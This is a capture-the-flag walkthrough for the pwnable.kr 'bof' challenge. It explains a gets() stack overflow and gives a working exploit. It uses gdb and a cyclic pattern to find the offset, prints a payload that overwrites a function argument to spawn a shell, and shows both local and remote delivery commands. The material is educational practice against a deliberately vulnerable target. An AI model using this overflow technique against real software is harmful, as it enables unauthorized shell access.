# pwnable.kr — `bof` Walkthrough

A reference for the **bof** challenge on <https://pwnable.kr/play.php>. This is a
classic stack buffer overflow where the goal is not to smash the return address,
but to **overwrite a function argument** so a comparison passes and spawns a shell.

I learned and practiced with this following wetw0rk's tutorial video (huge thanks to him!):
<https://www.youtube.com/watch?v=A-P2bhxzK1Y>

Disclaimer: I used Claude to help draft this, but it's not slop I promise :)

---

## 88. Tools needed

| Tool | What for | Install |
|------|----------|---------|
| **Kali Linux** | Default working environment (Ubuntu works too — but why tho) | — |
| **gdb** | Dynamic analysis: break, step, inspect memory at runtime | `sudo apt install gdb` |
| **pwntools** | Provides `cyclic` / `cyclic_find` (offset math) and `p32` (byte packing) | see below |
| **ssh** | Connect to the challenge box to read the flag | preinstalled |

### Installing pwntools (read this — there's a gotcha)

```bash
pipx install pwntools          # what I used
# or
pip install pwntools --break-system-packages   # Kali ships a managed Python; this flag avoids the nag
```

**Gotcha I hit:** after `pipx install`, the standalone `cyclic` command was "not found",
and `python3 -c "from pwn import *"` couldn't import it either. That's because **pipx
installs into its own isolated venv**, so your normal `python3` can't see the `pwn`
module. Two fixes:

- Expose the library to your system Python: `pipx inject pwntools pwntools`
- Or just also do `pip install pwntools --break-system-packages`

For a library you `import` in one-liners (rather than a CLI you run as a command),
`pip install --break-system-packages` is the less fiddly choice. `pipx` is better for
standalone command-line tools.

> Note: `cyclic` isn't a separate install — it ships *inside* pwntools. We mostly use the
> Python functions `cyclic()` and `cyclic_find()` rather than the standalone command.
> **You don't even strictly need pwntools** — the payload bytes can be hardcoded with
> plain stdlib (see section 4), which sidesteps all the install/import drama.

We use **plain gdb** for the whole debugging session — no plugin (pwndbg/GEF) required.

### Challenge access

The challenge gives you SSH onto the box (this is how you read the flag):

```bash
ssh bof@pwnable.kr -p2222     # password: guest
```

There's also a downloadable binary + source on the challenge page, and a network service
on port 9000. See section 5 for which delivery method actually gets the flag.

---

## 1. The vulnerability

The challenge source C code is roughly:

```c
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);              // <-- no bounds checking
    if(key == 0xcafebabe){
        system("/bin/sh");         // <-- the goal
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);              // key is set to 0xdeadbeef
    return 0;
}
```

There are 2 facts here that make this exploitable:

1. **`gets()` has no length limit.** It copies stdin into the 32-byte buffer until a
   newline, happily writing past the end of the buffer into whatever memory follows.
2. **`key` is compared *after* `gets()` runs.** `key` is set to `0xdeadbeef` when
   `main` calls `func`, but the `cmp` against `0xcafebabe` happens *after* our input
   is read. That gap is the attack window.

**Mental model:** `key` is set → *we get to write memory* → `key` is read.
We reach across the stack with the overflow and overwrite the stored copy of `key`
*after* it's set but *before* it's compared.

### Stack layout (low address at top, high at bottom)

```
[ overflowme[32] ]   <- our input starts here (low address)
[ alignment pad  ]   <- compiler-added padding (this is why the offset > 40)
[ saved EBP (4)  ]
[ saved ret (4)  ]
[ key  (ebp+8)   ]   <- the target (high address)
```

`gets()` writes upward (toward higher addresses), so a long enough input flows from
the buffer through saved EBP and the saved return address and lands on `key`.

---

## 2. GDB session — finding where our input lands

Launch GDB on the binary:

```bash
gdb ./bof
```

### Set Intel syntax (so disassembly reads `mov dst, src`)

```gdb
set disassembly-flavor intel
```

> Note: the real command is `set disassembly-flavor intel`, not "set flavor to intel".

### Auto-print context on every stop

`hook-stop` defines commands GDB runs automatically every time execution halts (any
breakpoint or step), so you see registers + nearby disassembly without retyping:

```gdb
define hook-stop
  info registers
  disassemble $eip,+10
end
```

> Note: the command is `hook-stop` (with a hyphen), not "hookstop".

### Break at the very first instruction of main

```gdb
b *main
```

`b *main` breaks at the **exact address** of main's first instruction. The `*` matters:
plain `b main` skips the function prologue and breaks *after* the stack frame is set up,
whereas `b *main` stops before anything runs. Useful when you want to watch setup.

### Look at the code, then run

```gdb
disassemble main
r
disassemble func
```

### Break at the comparison

```gdb
b *func+40
```

`func+40` is the address of the `cmp DWORD PTR [ebp+0x8], 0xcafebabe` instruction —
i.e. **right after `gets()` has returned** (so our input is already in memory) and
**right before the comparison**. Stopping here lets us inspect what value is currently
sitting in `key`'s slot. (Confirm the exact offset from your own `disassemble func`
output; it may differ slightly per build.)

```gdb
c
```

### Feed the cyclic pattern

When prompted with `overflow me :`, paste a 200-byte cyclic (De Bruijn) pattern.
Generate it locally first (see section 3) and paste it, or feed it from a file.

A cyclic pattern is a string where every 4-byte chunk is unique, so wherever it lands
we can identify the exact position from the 4 bytes we see.

### Read the value sitting on `key`

```gdb
x/x $ebp+0x8
```

Example output:

```
0xffffce60:    0x6161616e
```

- Left (`0xffffce60`) = the **address** of `key`'s slot — ignore for the offset.
- Right (`0x6161616e`) = the **value** there now. It's pattern bytes (`a a a n`, all in
  the `0x61`–`0x7a` ASCII range), **not** `0xdeadbeef`. That confirms our overflow
  reached `key` and overwrote it. The slot is ours to control.

---

## 3. Finding the offset locally (run this on your Kali)

The 4 bytes (`0x6161616e`) act as a unique coordinate into the pattern. The cyclic
sequence is deterministic, so `cyclic_find` regenerates it and looks up the position —
it needs nothing but those 4 bytes (not the filler, not the length).

Generate the pattern:

```bash
python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))" > pattern.txt
```

Look up the offset from the value you observed:

```bash
python3 -c "from pwn import *; print(cyclic_find(0x6161616e))"
# -> 52
```

`cyclic_find` handles the little-endian byte reversal internally, so you don't hand-flip
bytes and miscount.

**Why 52 and not 40?** Buffer (32) + saved EBP (4) + saved return address (4) = 40, but
the compiler added alignment padding below the buffer, pushing the real distance to 52.
This is exactly why you *measure* the offset instead of assuming it — a hand-count of 40
would silently fail.

---

## 4. Building the payload

### With pwntools

```bash
python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*52 + p32(0xcafebabe))" > payload.txt
```

### Stdlib only (no pwntools — recommended, avoids import issues)

`p32(0xcafebabe)` is just the literal little-endian bytes `\xbe\xba\xfe\xca`, so you can
hardcode them:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')" > payload.txt
```

What this produces — **raw bytes, not ASCII text**:

- `b'A'*52` — 52 filler bytes (`0x41`). The content is irrelevant; only the *count*
  matters, so the next bytes land exactly on `key`.
- `b'\xbe\xba\xfe\xca'` — the 4 raw little-endian bytes of `0xcafebabe`. We must NOT send
  the text `"cafebabe"` (that's 8 ASCII letter-bytes `63 61 66 65...`, the wrong value).
- `sys.stdout.buffer.write(...)` — writes the raw byte channel. Plain `print` would
  re-encode as text and append a newline, corrupting the non-printable bytes.

Verify the payload (this is what mine looked like — 52 `A`s then `beba feca`):

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')" | xxd
```

```
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 beba feca                      AAAA....
```

The `A`s render on the right; `beba feca` shows as dots because those bytes have no
printable form — that's `0xcafebabe` sitting in the payload.

Payload structure:

```
[ 52 bytes of 'A' filler ]  +  [ be ba fe ca ]   = 56 bytes total
        spans to key              lands on key
```

---

## 5. Delivering it — and where the flag actually is

`system("/bin/sh")` opens an **interactive** shell. If you just redirect the payload in,
stdin hits end-of-file the instant the payload is consumed, so the shell opens and
immediately dies. Keep stdin open with a trailing `cat`:

```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')"; cat) | ./bof
```

The `cat` forwards your keystrokes into the live shell after the payload lands.

> **The shell is silent — no `$` prompt.** When you pipe into `/bin/sh` there's no TTY,
> so it won't print a prompt. It looks frozen at `overflow me :`. Don't wait — just type
> `id` or `ls` blind and hit Enter; the output proves you have a shell.

### ⚠️ Local vs. remote — this is the key gotcha

Running the exploit on my **locally compiled** copy gave two surprises:

1. **`*** stack smashing detected ***: terminated`** — a **stack canary** fired. Modern
   gcc compiles `bof.c` with stack protection *on* by default, so the overflow trips the
   canary and aborts before cleanly reaching the shell. (Sometimes it raced through and
   gave a shell anyway — marginal behavior, a local artifact.)
2. **No flag.** Even with a working local shell, `ls` showed only `bof  bof.c  notes.txt
   payload.txt` — my own files. **The flag doesn't live on my machine.** It only exists
   on the challenge server, owned by the privileged user the real service runs as.

So the local run is for *learning/validation*; it does not capture the flag.

**To make a local copy behave like the real (unprotected) target** for practice:

```bash
gcc -m32 -fno-stack-protector -z execstack bof.c -o bof
```

`-fno-stack-protector` removes the canary; `-m32` keeps it 32-bit so the 52 offset and
4-byte `0xcafebabe` stay valid.

### Getting the actual flag

The real pwnable.kr `bof` binary is built **without** the canary (that's the whole point),
so the clean overflow works there. Two ways to hit the real target:

**Network service (port 9000):**

```bash
python3 -c "from pwn import *; p=remote('pwnable.kr',9000); p.sendline(b'A'*52+p32(0xcafebabe)); p.interactive()"
```

**Over SSH** (you were given `ssh bof@pwnable.kr -p2222`, password `guest`): log in, then
run the exploit against the on-box binary the same way (`(payload; cat) | ./bof`), and the
shell you pop runs as the flag-owning user.

Once you're in the shell on the real target (silent prompt — just type):

```
ls
cat flag
```

That prints the flag. 🏁

---

## 6. Key takeaways

- **The bug is intent vs. mechanism.** The programmer expected `gets()` to read a short
  line of text; the CPU just copies bytes until a newline. Feeding raw non-printable
  bytes into something built for text is the whole attack.
- **Local ≠ remote.** My recompiled local binary had a stack canary and no flag; the
  hosted target has neither protection nor my files. Always know which binary you're
  actually attacking.
- **The canary is the lesson, live.** `*** stack smashing detected ***` is exactly the
  mitigation that *stops* this technique — seeing it fire locally is the textbook example
  of why unprotected binaries are the vulnerable ones.
- **The shell is silent over a pipe/socket.** No prompt ≠ no shell. Type `id`/`ls` blind.
- **Endianness everywhere.** Reading (`x/x` shows `0x6161616e` = stored `6e 61 61 61`) and
  writing (`\xbe\xba\xfe\xca`) both involve the little-endian reversal.
- **Measure, don't assume.** The 52-byte offset (not the naive 40) only showed up because
  we measured with a cyclic pattern.
- **Next rung:** overwriting the *saved return address* (the slot just below `key`)
  redirects execution instead of flipping a comparison — reuses everything here, different
  4 bytes in a different slot.

---

## Quick command reference

```bash
# 0. install pwntools (optional — payload can be stdlib-only)
pipx install pwntools && pipx inject pwntools pwntools
# or: pip install pwntools --break-system-packages

# 1. generate pattern, feed under gdb, read x/x $ebp+0x8
python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))" > pattern.txt

# 2. find offset from observed value
python3 -c "from pwn import *; print(cyclic_find(0x6161616e))"      # -> 52

# 3. build payload (stdlib, no import needed)
python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')" > payload.txt

# 4. fire locally (learning/validation; keeps shell alive). Recompile w/o canary first:
#    gcc -m32 -fno-stack-protector -z execstack bof.c -o bof
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')"; cat) | ./bof

# 5. capture the REAL flag — network service
python3 -c "from pwn import *; p=remote('pwnable.kr',9000); p.sendline(b'A'*52+p32(0xcafebabe)); p.interactive()"

# 5b. or over SSH, then run the local-pipe exploit on the box
ssh bof@pwnable.kr -p2222    # pw: guest

# once in the shell (silent prompt — type blind):
#   ls
#   cat flag
```
